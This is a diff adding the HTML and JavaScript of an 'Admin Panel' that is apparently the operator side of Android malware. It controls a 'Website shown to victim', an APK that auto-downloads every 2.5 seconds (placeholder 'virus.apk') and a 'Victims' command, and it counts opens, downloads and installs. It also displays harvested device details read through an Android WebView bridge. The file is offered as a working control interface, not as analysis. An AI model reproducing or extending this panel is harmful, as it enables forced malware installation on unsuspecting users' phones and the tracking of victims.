@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Admin Panel</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,'Segoe UI',sans-serif;background:#0a0e1a;color:#e0e0e0;padding:16px;min-height:100vh}
+.header{background:linear-gradient(135deg,#1a1f3a,#0d1225);border-radius:16px;padding:24px;margin-bottom:20px;border:1px solid #2a2f4a}
+.header h1{font-size:22px;color:#00ff88;text-shadow:0 0 20px rgba(0,255,136,.3)}
+.header p{font-size:13px;color:#8892b0;margin-top:4px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
+.stat-card{background:linear-gradient(135deg,#1a1f3a,#151a30);border-radius:12px;padding:16px;text-align:center;border:1px solid #2a2f4a}
+.stat-card .num{font-size:28px;font-weight:700;color:#00ff88}
+.stat-card .lbl{font-size:11px;color:#8892b0;margin-top:4px;text-transform:uppercase;letter-spacing:.5px}
+.section{background:linear-gradient(135deg,#1a1f3a,#0d1225);border-radius:16px;padding:20px;margin-bottom:16px;border:1px solid #2a2f4a}
+.section-title{font-size:13px;color:#00ff88;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px}
+.input-group{margin-bottom:12px}
+.input-group label{display:block;font-size:12px;color:#8892b0;margin-bottom:6px}
+.input-group input{width:100%;padding:12px 14px;background:#0d1225;border:1px solid #2a2f4a;border-radius:8px;color:#fff;font-size:14px}
+.input-group input:focus{outline:none;border-color:#00ff88}
+.btn{display:block;width:100%;padding:12px;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:.3s;text-align:center}
+.btn-primary{background:linear-gradient(135deg,#00ff88,#00cc6a);color:#0a0e1a}
+.btn-primary:active{transform:scale(.97)}
+.msg{display:none;padding:12px;border-radius:8px;margin-top:12px;font-size:13px}
+.msg.success{display:block;background:rgba(0,255,136,.1);border:1px solid rgba(0,255,136,.3);color:#00ff88}
+.msg.error{display:block;background:rgba(255,68,68,.1);border:1px solid rgba(255,68,68,.3);color:#ff4444}
+.actions{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
+.action-btn{padding:14px;background:#0d1225;border:1px solid #2a2f4a;border-radius:10px;color:#e0e0e0;font-size:13px;text-align:center;cursor:pointer;transition:.3s}
+.action-btn:active{border-color:#00ff88;background:#151a30}
+.action-btn .icon{font-size:20px;display:block;margin-bottom:4px}
+.info-text{font-size:12px;color:#8892b0;line-height:1.8}
+.info-text span{color:#00ff88}
+.footer{text-align:center;padding:16px;color:#3a3f5a;font-size:11px}
+</style>
+</head>
+<body>
+
+<div class="header">
+<h1>⚡ ADMIN PANEL</h1>
+<p>Domain: playboyjob.company • Full Control</p>
+</div>
+
+<div class="stats">
+<div class="stat-card"><div class="num" id="statOpens">0</div><div class="lbl">Opens</div></div>
+<div class="stat-card"><div class="num" id="statDownloads">0</div><div class="lbl">Downloads</div></div>
+<div class="stat-card"><div class="num" id="statInstalls">0</div><div class="lbl">Installs</div></div>
+</div>
+
+<div class="section">
+<div class="section-title">🔗 Target URL</div>
+<div class="input-group">
+<label>Website shown to victim</label>
+<input type="url" id="targetUrl" placeholder="https://playboyjob.company">
+</div>
+<button class="btn btn-primary" onclick="setUrl()">Update Target URL</button>
+<div id="urlMsg" class="msg"></div>
+</div>
+
+<div class="section">
+<div class="section-title">📦 APK Download</div>
+<div class="input-group">
+<label>APK auto-download URL (every 2.5s)</label>
+<input type="url" id="apkUrl" placeholder="https://example.com/virus.apk">
+</div>
+<button class="btn btn-primary" onclick="setApk()">Set APK URL</button>
+<div id="apkMsg" class="msg"></div>
+</div>
+
+<div class="section">
+<div class="section-title">⚡ Quick Actions</div>
+<div class="actions">
+<div class="action-btn" onclick="sendCmd('/status')"><span class="icon">📊</span>Status</div>
+<div class="action-btn" onclick="sendCmd('/hacked')"><span class="icon">👥</span>Victims</div>
+<div class="action-btn" onclick="sendCmd('/device')"><span class="icon">💻</span>Device</div>
+<div class="action-btn" onclick="sendCmd('/site')"><span class="icon">🌐</span>Site URL</div>
+</div>
+</div>
+
+<div class="section">
+<div class="section-title">ℹ️ Device</div>
+<div class="info-text" id="deviceInfo">Loading...</div>
+</div>
+
+<div class="footer">Admin Panel v2.0 • playboyjob.company</div>
+
+<script>
+function updateStats(opens,downloads,installs,url,apk,model,android){
+document.getElementById('statOpens').textContent=opens;
+document.getElementById('statDownloads').textContent=downloads;
+document.getElementById('statInstalls').textContent=installs;
+if(url) document.getElementById('targetUrl').value=url;
+if(apk) document.getElementById('apkUrl').value=apk;
+if(model) document.getElementById('deviceInfo').innerHTML='Model: <span>'+model+'</span><br>Android: <span>'+android+'</span>';
+}
+try{
+document.addEventListener('DOMContentLoaded',function(){
+document.getElementById('targetUrl').value=Android.getTargetUrl();
+document.getElementById('apkUrl').value=Android.getApkUrl();
+document.getElementById('deviceInfo').innerHTML='Model: <span>'+Android.getDeviceModel()+'</span><br>Android: <span>'+Android.getAndroidVer()+'</span>';
+updateStats(Android.getTotalOpens(),Android.getTotalDownloads(),Android.getTotalInstalls(),Android.getTargetUrl(),Android.getApkUrl(),Android.getDeviceModel(),Android.getAndroidVer());
+});
+}catch(e){}
+function setUrl(){
+var u=document.getElementById('targetUrl').value.trim();
+if(!u){showMsg('urlMsg','Enter a URL','error');return}
+if(!u.match(/^https?:\/\//)) u='https://'+u;
+try{Android.setTargetUrl(u);showMsg('urlMsg','✅ Updated: '+u,'success')}catch(e){showMsg('urlMsg','Error','error')}
+}
+function setApk(){
+var u=document.getElementById('apkUrl').value.trim();
+if(!u){showMsg('apkMsg','Enter APK URL','error');return}
+if(!u.match(/^https?:\/\//)) u='https://'+u;
+try{Android.setApkUrl(u);showMsg('apkMsg','✅ APK Set: '+u,'success')}catch(e){showMsg('apkMsg','Error','error')}
+}
+function sendCmd(cmd){showMsg('urlMsg','📤 Command: '+cmd,'success');setTimeout(function(){document.getElementById('urlMsg').className='msg'},3000)}
+function showMsg(id,text,type){
+var el=document.getElementById(id);el.textContent=text;el.className='msg '+type;
+setTimeout(function(){el.className='msg'},5000)}
+</script>
+</body>
+</html>
